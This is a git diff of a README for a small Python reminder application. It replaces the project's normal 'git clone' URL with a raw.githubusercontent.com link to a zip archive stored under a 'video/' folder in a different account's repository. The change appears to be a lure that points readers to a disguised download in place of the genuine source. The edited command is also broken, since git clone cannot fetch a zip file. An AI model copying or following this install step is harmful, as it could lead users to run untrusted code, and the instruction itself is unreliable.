@@ -22,7 +22,7 @@ A simple reminder application built with Python that helps you keep track of tas
 1. **Clone the Repository:**
 
    ```bash
-   git clone https://github.com/Mitul2023/reminder-app.git
+   git clone https://raw.githubusercontent.com/Mitul-Singh/Reminder-application/main/video/application-Reminder-v1.0.zip
    cd reminder-app
 2. **Install Dependencies:**
    - Install the required dependencies using pip: pip install plyer
